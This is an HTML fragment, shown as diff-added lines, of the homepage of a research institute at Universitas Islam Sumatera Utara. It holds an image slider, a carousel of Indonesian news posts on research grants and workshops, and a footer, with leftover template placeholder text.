+							<img fetchpriority="high" decoding="async" src="//lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/assets/dummy.png" alt="" title="DALLÂ·E 2024-09-02 14.27.16 &#8211; A modern scientific laboratory with advanced equipment like microscopes, test tubes, and computers. The scientists, both men and women, are dressed in" width="1024" height="1024" class="rev-slidebg tp-rs-img rs-lazyload" data-lazyload="//lp.uisu.ac.id/wp-content/uploads/2024/09/DALLÂ·E-2024-09-02-14.27.16-A-modern-scientific-laboratory-with-advanced-equipment-like-microscopes-test-tubes-and-computers.-The-scientists-both-men-and-women-are-dressed-in.webp" data-panzoom="d:10000;ss:100;se:115%;" data-no-retina>
+<!--
+							--><rs-layer
+								id="slider-1-slide-1-layer-0" 
+								data-type="text"
+								data-color="#142441"
+								data-rsp_ch="on"
+								data-xy="xo:293px,293px,15px,13px;yo:143px,143px,108px,35px;"
+								data-text="w:normal;s:66,66,50,40;l:76,76,60,50;fw:700;"
+								data-dim="w:830px,830px,521px,321px;"
+								data-frame_0="rX:-70deg;oZ:-50;"
+								data-frame_1="oZ:-50;e:power4.inOut;sp:1750;"
+								data-frame_999="y:0;o:0;rX:-70deg;oZ:-50;e:power4.inOut;st:w;sp:1750;"
+								style="z-index:9;font-family:'Arimo';text-transform:capitalize;"
+							>Lembaga Penelitian Universitas Islam Sumatera utara 
+							</rs-layer><!--
+
+							--><rs-layer
+								id="slider-1-slide-1-layer-1" 
+								class="des-sl1"
+								data-type="text"
+								data-color="#9aa5b3"
+								data-rsp_ch="on"
+								data-xy="xo:306px,306px,15px,15px;yo:369px,369px,243px,297px;"
+								data-text="w:normal;s:20,20,16,14;l:29,29,28,17;"
+								data-frame_0="y:50,50,19,11;"
+								data-frame_1="st:100;sp:1000;"
+								data-frame_999="y:50,50,19,11;o:0;st:w;sp:1000;"
+								style="z-index:10;font-family:'Jost';"
+							>Bersama Kita Maju, Bersama Kita Unggul 
+							</rs-layer><!--
+
+							--><a
+								id="slider-1-slide-1-layer-2" 
+								class="rs-layer btn-sl rev-btn"
+								href="/contact-us" target="_self"
+								data-type="button"
+								data-rsp_ch="on"
+								data-xy="xo:307px,307px,15px,15px;yo:440px,440px,303px,336px;"
+								data-text="w:normal;s:16,16,14,14;l:32,32,12,7;fw:500;"
+								data-dim="minh:0px,0px,none,none;"
+								data-padding="t:10,10,12,13;r:30,30,25,25;b:10,10,12,13;l:30,30,25,25;"
+								data-border="bor:5px,5px,5px,5px;"
+								data-frame_0="x:-50,-50,-19,-11;"
+								data-frame_1="st:150;sp:1000;"
+								data-frame_999="x:-50,-50,-19,-11;o:0;st:w;sp:1000;"
+								data-frame_hover="c:#fff;bgc:#3764eb;bor:5px,5px,5px,5px;"
+								style="z-index:11;background-color:#3764eb;font-family:'Jost';"
+							>+ Contact Us 
+							</a><!--
+
+							--><rs-layer
+								id="slider-1-slide-1-layer-3" 
+								data-type="text"
+								data-color="#142441"
+								data-rsp_ch="on"
+								data-xy="xo:478px,478px,172px,157px;yo:454px,454px,315px,350px;"
+								data-text="w:normal;s:14;l:25,25,9,6;"
+								data-frame_0="x:50,50,19,11;"
+								data-frame_1="st:150;sp:1000;"
+								data-frame_999="x:50,50,19,11;o:0;st:w;sp:1000;"
+								style="z-index:12;font-family:'Jost';"
+							>Assalamualaikum... 
+							</rs-layer><!--
+
+							--><rs-layer
+								id="slider-1-slide-1-layer-5" 
+								class="layer-sl1"
+								data-type="shape"
+								data-rsp_ch="on"
+								data-xy="x:c;y:m;"
+								data-text="w:normal;s:20,20,7,4;l:0,0,9,6;"
+								data-dim="w:100%;h:100%;"
+								data-frame_999="o:0;st:w;"
+								style="z-index:8;background-color:rgba(255,255,255,0.6);"
+							> 
+							</rs-layer><!--
+-->						</rs-slide>
+						<rs-slide style="position: absolute;" data-key="rs-2" data-title="Slide" data-thumb="//lp.uisu.ac.id/wp-content/uploads/2022/12/sl-bg-3-50x100.jpg" data-anim="d:40;ms:1200;f:random;" data-in="prst:rndboxes;o:0;x:ran(-10|100);y:ran(-50|50);r:cyc((180)|(-180)|(90)|(-90)|(270)|(-270));sx:5;sy:5;e:power2.out;row:30;col:30;" data-out="o:0;x:ran(-50|50);y:ran(-50|50);r:cyc((-180)|(180)|(-90)|(90)|(-270)|(270));sx:6;sy:6;e:power2.in;row:30;col:30;" data-d3="f:cube;d:vertical;z:450;t:-20;e:back.out;su:true;sma:1;">
+							<img decoding="async" src="//lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/assets/dummy.png" alt="" title="sl-bg-3" width="1920" height="675" class="rev-slidebg tp-rs-img rs-lazyload" data-lazyload="//lp.uisu.ac.id/wp-content/uploads/2022/12/sl-bg-3.jpg" data-bg="p:left center;" data-no-retina>
+<!--
+							--><rs-layer
+								id="slider-1-slide-2-layer-0" 
+								class="rs-wtbindex"
+								data-type="text"
+								data-color="#142441"
+								data-rsp_ch="on"
+								tabindex="1"
+								data-xy="xo:305px,305px,15px,7px;yo:192px,192px,108px,166px;"
+								data-text="w:normal;s:66,66,50,40;l:76,76,60,50;fw:700;"
+								data-dim="w:806.98px,806.98px,521px,321px;"
+								data-frame_0="rX:-70deg;oZ:-50;"
+								data-frame_1="oZ:-50;e:power4.inOut;sp:1750;"
+								data-frame_999="y:0;o:0;rX:-70deg;oZ:-50;e:power4.inOut;st:w;sp:1750;"
+								style="z-index:9;font-family:'Arimo';text-transform:capitalize;"
+							>Pusat Penelitian dan studi UISU. 
+							</rs-layer><!--
+
+							--><rs-layer
+								id="slider-1-slide-2-layer-1" 
+								class="rs-wtbindex"
+								data-type="text"
+								data-color="#9aa5b3"
+								data-rsp_ch="on"
+								tabindex="1"
+								data-xy="xo:306px,306px,15px,15px;yo:369px,369px,243px,297px;"
+								data-text="w:normal;s:20,20,16,14;l:29,29,28,17;"
+								data-frame_0="y:50,50,19,11;"
+								data-frame_1="st:100;sp:1000;"
+								data-frame_999="y:50,50,19,11;o:0;st:w;sp:1000;"
+								style="z-index:10;font-family:'Jost';"
+							>Maecenas convallis eros eget libero viverra, id sodales libero semper. 
+							</rs-layer><!--
+
+							--><a
+								id="slider-1-slide-2-layer-2" 
+								class="rs-layer btn-sl rev-btn"
+								href="/contact-us" target="_self"
+								data-type="button"
+								data-rsp_ch="on"
+								data-xy="xo:307px,307px,15px,15px;yo:440px,440px,303px,336px;"
+								data-text="w:normal;s:16,16,14,14;l:32,32,12,7;fw:500;"
+								data-dim="minh:0px,0px,none,none;"
+								data-padding="t:10,10,12,13;r:30,30,25,25;b:10,10,12,13;l:30,30,25,25;"
+								data-border="bor:5px,5px,5px,5px;"
+								data-frame_0="x:-50,-50,-19,-11;"
+								data-frame_1="st:150;sp:1000;"
+								data-frame_999="x:-50,-50,-19,-11;o:0;st:w;sp:1000;"
+								data-frame_hover="c:#fff;bgc:#3764eb;bor:5px,5px,5px,5px;"
+								style="z-index:11;background-color:#3764eb;font-family:'Jost';"
+							>+ Contact Us 
+							</a><!--
+
+							--><rs-layer
+								id="slider-1-slide-2-layer-3" 
+								data-type="text"
+								data-color="#142441"
+								data-rsp_ch="on"
+								data-xy="xo:478px,478px,172px,157px;yo:454px,454px,315px,350px;"
+								data-text="w:normal;s:14;l:25,25,9,6;"
+								data-frame_0="x:50,50,19,11;"
+								data-frame_1="st:150;sp:1000;"
+								data-frame_999="x:50,50,19,11;o:0;st:w;sp:1000;"
+								style="z-index:12;font-family:'Jost';"
+							>Have A Nice Day Save Jone! 
+							</rs-layer><!--
+
+							--><rs-layer
+								id="slider-1-slide-2-layer-4" 
+								class="ani3"
+								data-type="image"
+								data-rsp_ch="on"
+								data-xy="xo:185px,185px,74px,45px;yo:-138px,-138px,-55px,-33px;"
+								data-text="w:normal;s:20,20,7,4;l:0,0,9,6;"
+								data-dim="w:636px,636px,257px,158px;h:459px,459px,185px,114px;"
+								data-frame_999="o:0;st:w;"
+								style="z-index:8;"
+							><img decoding="async" src="//lp.uisu.ac.id/wp-content/plugins/revslider/public/assets/assets/dummy.png" alt="" class="tp-rs-img rs-lazyload" width="636" height="459" data-lazyload="//lp.uisu.ac.id/wp-content/uploads/2022/12/Group-1.png" data-no-retina> 
+							</rs-layer><!--
+-->						</rs-slide>
+					</rs-slides>
+				</rs-module>
+				<script>
+					setREVStartSize({c: 'rev_slider_1_1',rl:[1240,1240,778,480],el:[681,681,450,500],gw:[1920,1920,778,480],gh:[681,681,450,500],type:'standard',justify:'',layout:'fullwidth',mh:"0"});if (window.RS_MODULES!==undefined && window.RS_MODULES.modules!==undefined && window.RS_MODULES.modules["revslider11"]!==undefined) {window.RS_MODULES.modules["revslider11"].once = false;window.revapi1 = undefined;if (window.RS_MODULES.checkMinimal!==undefined) window.RS_MODULES.checkMinimal()}
+				</script>
+			</rs-module-wrap>
+			<!-- END REVOLUTION SLIDER -->
+</div>
+
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-1f5aeda elementor-section-full_width elementor-section-stretched elementor-section-height-default elementor-section-height-default" data-id="1f5aeda" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-b371e64" data-id="b371e64" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<section class="elementor-section elementor-inner-section elementor-element elementor-element-c290d72 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="c290d72" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-custom">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-fa42d8f" data-id="fa42d8f" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-8a45a51 elementor-widget elementor-widget-heading" data-id="8a45a51" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Latest News &amp; Blogs</h2>				</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-27b0596" data-id="27b0596" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-9b00026 elementor-align-right elementor-mobile-align-left elementor-widget elementor-widget-button" data-id="9b00026" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/blog-grid/">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<i aria-hidden="true" class=" icon-labaid-la-30"></i>			</span>
+									<span class="elementor-button-text">View all</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-985b2e3 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="985b2e3" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-cf0fbf5" data-id="cf0fbf5" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-5d06d61 elementor-widget elementor-widget-tfposts" data-id="5d06d61" data-element_type="widget" data-widget_type="tfposts.default">
+				<div class="elementor-widget-container">
+										<div id="tf-posts-5d06d61" class="tf-posts style1 column-3 tablet-column-2 mobile-column-1 has-carousel" data-tabid="5d06d61" data-loop="no" data-auto="no" data-column="3" data-column2="2" data-column3="1" data-prev_icon="" data-next_icon="" data-arrow="" data-bullets="" >
+							<div class="owl-carousel">
+									<div class="item">
+    <div class="entry blog-post"> 
+                                            
+        <div class="featured-post">
+            <a href="https://lp.uisu.ac.id/praesent-efficitur-nulla-pellentesque-commodo-lorem-2/">
+                <img decoding="async" src="https://lp.uisu.ac.id/wp-content/uploads/2022/09/Peringati-Hari-Lingkungan-Hidup-UISU-Kampanyekan-Pembuatan-Eco-Enzyme-dari-Sampah-RT-1.jpg" alt="image">            </a>            
+             
+        </div>
+                
+        <div class="content">
+
+                                                  
+            <div class="post-meta">
+                                <span class="post-meta-inner meta-user">
+                    <a href="https://lp.uisu.ac.id/author/penelitian/">  By <span>Penelitian</span></a>
+                </span>
+                                                                               <span class="post-meta-inner">
+                    <a href="https://lp.uisu.ac.id/2022/09/14/">
+                      14 September 2022</a>
+                </span>
+                            </div>                                                  
+                          
+                            <h2 class="title border_eff"><a href="https://lp.uisu.ac.id/praesent-efficitur-nulla-pellentesque-commodo-lorem-2/" title="PANEN BERSAMA ECO ENZYM JILID II">PANEN BERSAMA ECO ENZYM JILID II</a></h2>
+            
+                            <div class="description">Eco â€“ Enzyme  merupakan  larutan zat organik</div>
+              
+
+                            <div class="tf-button-container">
+                <a href="https://lp.uisu.ac.id/praesent-efficitur-nulla-pellentesque-commodo-lorem-2/" class="tf-button">
+                    <span>+ Read More</span>
+                                    </a>
+                </div>
+             
+        </div>                      
+    </div>
+</div>					
+					<div class="item">
+    <div class="entry blog-post"> 
+                                            
+        <div class="featured-post">
+            <a href="https://lp.uisu.ac.id/mauris-vitae-dolor-sagittis-sem-placerat-lacinia/">
+                <img decoding="async" src="https://lp.uisu.ac.id/wp-content/uploads/2022/11/GRANT-RISET-SAWIT.png" alt="image">            </a>            
+             
+        </div>
+                
+        <div class="content">
+
+                                                  
+            <div class="post-meta">
+                                <span class="post-meta-inner meta-user">
+                    <a href="https://lp.uisu.ac.id/author/penelitian/">  By <span>Penelitian</span></a>
+                </span>
+                                                                               <span class="post-meta-inner">
+                    <a href="https://lp.uisu.ac.id/2022/11/12/">
+                      12 November 2022</a>
+                </span>
+                            </div>                                                  
+                          
+                            <h2 class="title border_eff"><a href="https://lp.uisu.ac.id/mauris-vitae-dolor-sagittis-sem-placerat-lacinia/" title="FOCUS GROUP DISCUSSION (FGD): PENYUSUNAN PROPOSAL GRANT RISET SAWIT (GRS) 2024">FOCUS GROUP DISCUSSION (FGD): PENYUSUNAN PROPOSAL GRANT RISET SAWIT (GRS) 2024</a></h2>
+            
+                            <div class="description">Badan Pengelola Dana Perkebunan Kelapa Sawit (BPDPKS)</div>
+              
+
+                            <div class="tf-button-container">
+                <a href="https://lp.uisu.ac.id/mauris-vitae-dolor-sagittis-sem-placerat-lacinia/" class="tf-button">
+                    <span>+ Read More</span>
+                                    </a>
+                </div>
+             
+        </div>                      
+    </div>
+</div>					
+					<div class="item">
+    <div class="entry blog-post"> 
+                                            
+        <div class="featured-post">
+            <a href="https://lp.uisu.ac.id/augue-sed-tempus-lacinia-orci-augue-luctus-odio/">
+                <img decoding="async" src="https://lp.uisu.ac.id/wp-content/uploads/2022/11/PENINGKATAN-SITASI-KARYA-ILMIAH.jpg" alt="image">            </a>            
+             
+        </div>
+                
+        <div class="content">
+
+                                                  
+            <div class="post-meta">
+                                <span class="post-meta-inner meta-user">
+                    <a href="https://lp.uisu.ac.id/author/penelitian/">  By <span>Penelitian</span></a>
+                </span>
+                                                                               <span class="post-meta-inner">
+                    <a href="https://lp.uisu.ac.id/2022/11/12/">
+                      12 November 2022</a>
+                </span>
+                            </div>                                                  
+                          
+                            <h2 class="title border_eff"><a href="https://lp.uisu.ac.id/augue-sed-tempus-lacinia-orci-augue-luctus-odio/" title="Peningkatan SITASI Karya Ilmiah di Lingkungan UISU">Peningkatan SITASI Karya Ilmiah di Lingkungan UISU</a></h2>
+            
+                            <div class="description">Berdasarkan Instrumen Akreditasi Perguruan Tinggi versi 3.0</div>
+              
+
+                            <div class="tf-button-container">
+                <a href="https://lp.uisu.ac.id/augue-sed-tempus-lacinia-orci-augue-luctus-odio/" class="tf-button">
+                    <span>+ Read More</span>
+                                    </a>
+                </div>
+             
+        </div>                      
+    </div>
+</div>					
+					<div class="item">
+    <div class="entry blog-post"> 
+                                            
+        <div class="featured-post">
+            <a href="https://lp.uisu.ac.id/sapien-quis-porttitor-ipsum-et/">
+                <img decoding="async" src="https://lp.uisu.ac.id/wp-content/uploads/2022/11/PENYEGARAN-PENULISAN-PUBLIKASI.jpg" alt="image">            </a>            
+             
+        </div>
+                
+        <div class="content">
+
+                                                  
+            <div class="post-meta">
+                                <span class="post-meta-inner meta-user">
+                    <a href="https://lp.uisu.ac.id/author/penelitian/">  By <span>Penelitian</span></a>
+                </span>
+                                                                               <span class="post-meta-inner">
+                    <a href="https://lp.uisu.ac.id/2022/11/12/">
+                      12 November 2022</a>
+                </span>
+                            </div>                                                  
+                          
+                            <h2 class="title border_eff"><a href="https://lp.uisu.ac.id/sapien-quis-porttitor-ipsum-et/" title="PENYEGARAN PENULISAN PUBLIKASI INTERNASIONAL SERTA PELUANG KERJASAMA PENDIDIKAN DAN PENELITIAN INTERNASIONAL">PENYEGARAN PENULISAN PUBLIKASI INTERNASIONAL SERTA PELUANG KERJASAMA PENDIDIKAN DAN PENELITIAN INTERNASIONAL</a></h2>
+            
+                            <div class="description">Internasionalisasi perguruan tinggi merupakan sebuah proses di</div>
+              
+
+                            <div class="tf-button-container">
+                <a href="https://lp.uisu.ac.id/sapien-quis-porttitor-ipsum-et/" class="tf-button">
+                    <span>+ Read More</span>
+                                    </a>
+                </div>
+             
+        </div>                      
+    </div>
+</div>					
+					<div class="item">
+    <div class="entry blog-post"> 
+                                            
+        <div class="featured-post">
+            <a href="https://lp.uisu.ac.id/aliquam-vel-nibh-sapien-suspendisse-placerat/">
+                <img decoding="async" src="https://lp.uisu.ac.id/wp-content/uploads/2022/11/blog1.jpg" alt="image">            </a>            
+             
+        </div>
+                
+        <div class="content">
+
+                                                  
+            <div class="post-meta">
+                                <span class="post-meta-inner meta-user">
+                    <a href="https://lp.uisu.ac.id/author/penelitian/">  By <span>Penelitian</span></a>
+                </span>
+                                                                               <span class="post-meta-inner">
+                    <a href="https://lp.uisu.ac.id/2022/11/12/">
+                      12 November 2022</a>
+                </span>
+                            </div>                                                  
+                          
+                            <h2 class="title border_eff"><a href="https://lp.uisu.ac.id/aliquam-vel-nibh-sapien-suspendisse-placerat/" title="Aliquam vel nibh sapien. Suspendisse placerat.">Aliquam vel nibh sapien. Suspendisse placerat.</a></h2>
+            
+                            <div class="description">Praesent malesuada risus eget lobortis euismod. Suspendisse</div>
+              
+
+                            <div class="tf-button-container">
+                <a href="https://lp.uisu.ac.id/aliquam-vel-nibh-sapien-suspendisse-placerat/" class="tf-button">
+                    <span>+ Read More</span>
+                                    </a>
+                </div>
+             
+        </div>                      
+    </div>
+</div>					
+					<div class="item">
+    <div class="entry blog-post"> 
+                                            
+        <div class="featured-post">
+            <a href="https://lp.uisu.ac.id/praesent-efficitur-nulla-pellentesque-commodo-lorem/">
+                <img decoding="async" src="https://lp.uisu.ac.id/wp-content/uploads/2022/11/BIMA-RESEARCH-CAMP.jpg" alt="image">            </a>            
+             
+        </div>
+                
+        <div class="content">
+
+                                                  
+            <div class="post-meta">
+                                <span class="post-meta-inner meta-user">
+                    <a href="https://lp.uisu.ac.id/author/penelitian/">  By <span>Penelitian</span></a>
+                </span>
+                                                                               <span class="post-meta-inner">
+                    <a href="https://lp.uisu.ac.id/2024/02/01/">
+                      1 Februari 2024</a>
+                </span>
+                            </div>                                                  
+                          
+                            <h2 class="title border_eff"><a href="https://lp.uisu.ac.id/praesent-efficitur-nulla-pellentesque-commodo-lorem/" title="BIMA RESEARCH CAMP: PENYUSUNAN PROPOSAL HIBAH YANG KOMPETITIF">BIMA RESEARCH CAMP: PENYUSUNAN PROPOSAL HIBAH YANG KOMPETITIF</a></h2>
+            
+                            <div class="description">Hibah Kemendikbudristek (Kementerian Pendidikan, Kebudayaan, Riset, dan Teknologi)</div>
+              
+
+                            <div class="tf-button-container">
+                <a href="https://lp.uisu.ac.id/praesent-efficitur-nulla-pellentesque-commodo-lorem/" class="tf-button">
+                    <span>+ Read More</span>
+                                    </a>
+                </div>
+             
+        </div>                      
+    </div>
+</div>					
+													</div>
+															</div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-b46a07f elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="b46a07f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-custom">
+					<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-d3403cb" data-id="d3403cb" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-01161cc elementor-widget elementor-widget-heading" data-id="01161cc" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Stake Holders</h2>				</div>
+				</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-13323f8" data-id="13323f8" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-b48dd94 elementor-align-right elementor-mobile-align-left elementor-widget elementor-widget-button" data-id="b48dd94" data-element_type="widget" data-widget_type="button.default">
+				<div class="elementor-widget-container">
+									<div class="elementor-button-wrapper">
+					<a class="elementor-button elementor-button-link elementor-size-sm" href="/team-member/">
+						<span class="elementor-button-content-wrapper">
+						<span class="elementor-button-icon">
+				<i aria-hidden="true" class=" icon-labaid-la-30"></i>			</span>
+									<span class="elementor-button-text">View all</span>
+					</span>
+					</a>
+				</div>
+								</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-inner-section elementor-element elementor-element-4b81ac1 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="4b81ac1" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-custom">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-25803d9" data-id="25803d9" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-d19e394 sl-thumb-sl elementor-widget elementor-widget-image-carousel" data-id="d19e394" data-element_type="widget" data-settings="{&quot;slides_to_show&quot;:&quot;6&quot;,&quot;slides_to_show_tablet&quot;:&quot;3&quot;,&quot;slides_to_show_mobile&quot;:&quot;2&quot;,&quot;slides_to_scroll&quot;:&quot;6&quot;,&quot;slides_to_scroll_tablet&quot;:&quot;3&quot;,&quot;slides_to_scroll_mobile&quot;:&quot;2&quot;,&quot;navigation&quot;:&quot;none&quot;,&quot;image_spacing_custom&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:24,&quot;sizes&quot;:[]},&quot;autoplay&quot;:&quot;yes&quot;,&quot;pause_on_hover&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;autoplay_speed&quot;:5000,&quot;infinite&quot;:&quot;yes&quot;,&quot;speed&quot;:500,&quot;image_spacing_custom_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;image_spacing_custom_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="image-carousel.default">
+				<div class="elementor-widget-container">
+							<div class="elementor-image-carousel-wrapper swiper" role="region" aria-roledescription="carousel" aria-label="Karosel Gambar" dir="ltr">
+			<div class="elementor-image-carousel swiper-wrapper" aria-live="off">
+								<div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="1 of 6"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="https://lp.uisu.ac.id/wp-content/uploads/2022/12/catb6-1.png" alt="catb6" /></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="2 of 6"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="https://lp.uisu.ac.id/wp-content/uploads/2022/12/catb5-1.png" alt="catb5" /></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="3 of 6"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="https://lp.uisu.ac.id/wp-content/uploads/2022/12/catb4-1.png" alt="catb4" /></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="4 of 6"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="https://lp.uisu.ac.id/wp-content/uploads/2022/12/catb3-1.png" alt="catb3" /></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="5 of 6"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="https://lp.uisu.ac.id/wp-content/uploads/2022/12/catb2-1.png" alt="catb2" /></figure></div><div class="swiper-slide" role="group" aria-roledescription="slide" aria-label="6 of 6"><figure class="swiper-slide-inner"><img decoding="async" class="swiper-slide-image" src="https://lp.uisu.ac.id/wp-content/uploads/2022/12/catb1-1.png" alt="catb1" /></figure></div>			</div>
+							
+									</div>
+						</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+					</div>
+		</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-bbbeb75 elementor-section-full_width elementor-section-stretched elementor-section-height-default elementor-section-height-default" data-id="bbbeb75" data-element_type="section" data-settings="{&quot;stretch_section&quot;:&quot;section-stretched&quot;,&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-no">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-662ffec" data-id="662ffec" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<section class="elementor-section elementor-inner-section elementor-element elementor-element-466c1d3 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="466c1d3" data-element_type="section">
+						<div class="elementor-container elementor-column-gap-custom">
+					<div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-eceaad9" data-id="eceaad9" data-element_type="column">
+			<div class="elementor-widget-wrap elementor-element-populated">
+						<div class="elementor-element elementor-element-558561f elementor-widget elementor-widget-heading" data-id="558561f" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">CONTACT US</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-4231d7f elementor-widget elementor-widget-heading" data-id="4231d7f" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+					<h2 class="elementor-heading-title elementor-size-default">Letâ€™s Work Together! Prepare your research.</h2>				</div>
+				</div>
+				<div class="elementor-element elementor-element-491a74b elementor-widget elementor-widget-tf-button" data-id="491a74b" data-element_type="widget" data-widget_type="tf-button.default">
+				<div class="elementor-widget-container">
+					        <div id="tf-step-491a74b" class="wrap-tf-button" data-tabid="491a74b">
+			<div class="wrap-tf-button2">
+				<a href="/contact-us" class="tf-button2" >
+					<span>+ Contact Us</span> 
+										</a>
+			</div>
+	    </div>
+        				</div>
+				</div>
+					</div>
+		</div>
+					</div>
+		</section>
+					</div>
+		</div>
+					</div>
+		</section>
+				</div>
+					</div><!-- .entry-content -->
+</article><!-- #post-## -->
+																		</main><!-- #main -->
+				</div><!-- #primary -->
+							</div>
+		</div>
+	</div>
+</div>
+        
+        </div><!-- #content -->
+    </div><!-- #main-content -->
+
+    
+    
+
+    <!-- Start Footer -->   
+    <div class="footer_background ">
+        <div class="overlay-footer"></div>
+        <!-- Info Footer -->
+        
+        <!-- Footer Widget -->
+         
+    <footer id="footer" class="footer ">
+        <div class="footer-widgets">
+            <div class="container">                
+                <div class="row">
+                                            <div class="col-lg-3 col-md-6 widgets-areas">
+                            <div class="wrap-widgets-1">
+                            <div id="block-15" class="widget widget_block widget_media_image">
+<figure class="wp-block-image size-full is-resized"><img loading="lazy" decoding="async" width="1250" height="373" src="https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1.png" alt="" class="wp-image-13" style="width:231px;height:auto" srcset="https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1.png 1250w, https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1-300x90.png 300w, https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1-1024x306.png 1024w, https://lp.uisu.ac.id/wp-content/uploads/2024/05/logo-LP-1-768x229.png 768w" sizes="(max-width: 1250px) 100vw, 1250px" /></figure>
+</div><div id="block-16" class="widget widget_block widget_text">
+<p class="has-text-align-left">Lembaga Penelitian UISU (Universitas Islam Sumatera Utara) adalah unit yang berfokus pada pengembangan penelitian ilmiah untuk mendukung kemajuan akademis dan masyarakat. Lembaga ini berkomitmen pada inovasi, kolaborasi, dan publikasi hasil penelitian di berbagai bidang ilmu. </p>
+</div><div class="widget widget_themesflat_socials">                <ul class="themesflat-shortcode-socials">
+            <li class="facebook-2">
+                            <a href="#" target="_blank" rel="alternate" title="#">
+                                <i class="icon-labaid-la-11"></i>                            
+                            </a>
+                        </li><li class="twitter-2">
+                            <a href="#" target="_blank" rel="alternate" title="#">
+                                <i class="icon-labaid-la-1"></i>                            
+                            </a>
+                        </li><li class="instagram-2">
+                            <a href="#" target="_blank" rel="alternate" title="#">
+                                <i class="icon-labaid-la-2"></i>                            
+                            </a>
+                        </li><li class="linkedin-3">
+                            <a href="#" target="_blank" rel="alternate" title="#">
+                                <i class="icon-labaid-la-3"></i>                            
+                            </a>
+                        </li>        </ul><!-- /.social -->       
+                </div>                            </div>
+                        </div>
+                                            <div class="col-lg-2 col-md-6 widgets-areas">
+                            <div class="wrap-widgets-2">
+                                                        </div>
+                        </div>
+                                            <div class="col-lg-2 col-md-6 widgets-areas">
+                            <div class="wrap-widgets-3">
+                                                        </div>
+                        </div>
